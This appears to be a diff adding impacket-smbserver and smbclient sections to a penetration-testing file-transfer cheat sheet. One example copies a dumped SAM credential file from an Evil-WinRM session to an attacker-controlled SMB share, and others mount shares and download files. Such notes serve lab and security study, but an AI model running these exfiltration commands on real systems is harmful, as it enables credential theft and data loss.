@@ -128,3 +128,43 @@ $tcpClient.Close()
 
 Write-Host "File sent successfully to ${server}:${port}!"
 ```
+
+## impacket-smbserver
+
+```bash
+### EXAMPLE 1
+# host
+sudo impacket-smbserver -smb2support MyCoolShare ./
+# remote machine
+*Evil-WinRM* PS C:\tmp> copy-item -path ./SAM_DUMP -destination \\10.10.16.7\MyCoolShare\sam_dump
+
+
+### EXAMPLE 2
+impacket-smbserver $FULL_PATH -smb2support -user $USERNAME -password $PASSWD
+# sudo ./.local/bin/smbserver.py -smb2support -user fuser -password fuser share .
+
+
+### EXAMPLE 3
+# host
+impacket-smbserver [SERVER_NAME] [FULL_PATH_TO_SHARE] -smb2support -user [USERNAME] -password [PASSWD]
+
+# remote machine
+$pass = convertto-securestring '[PASSWD]' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('[USERNAME]', $pass)
+New-PSDrive -Name [DRIVE_NAME] -PSProvider FileSystem -Credential $cred -Root \[REMOTE_HOST]\[SERVER_NAME]
+cd [SERVER_NAME]:\
+```
+
+## impacket-smbclient
+
+```bash
+./smbclient.py fuser:fuser@127.0.0.1
+
+ls Machine\Scripts\*       # list content of directory
+
+shares                     # list shares
+use $SHARE                 # use a share
+
+get $FILE                  # download file
+mget *                     # download everything from current directory
+```
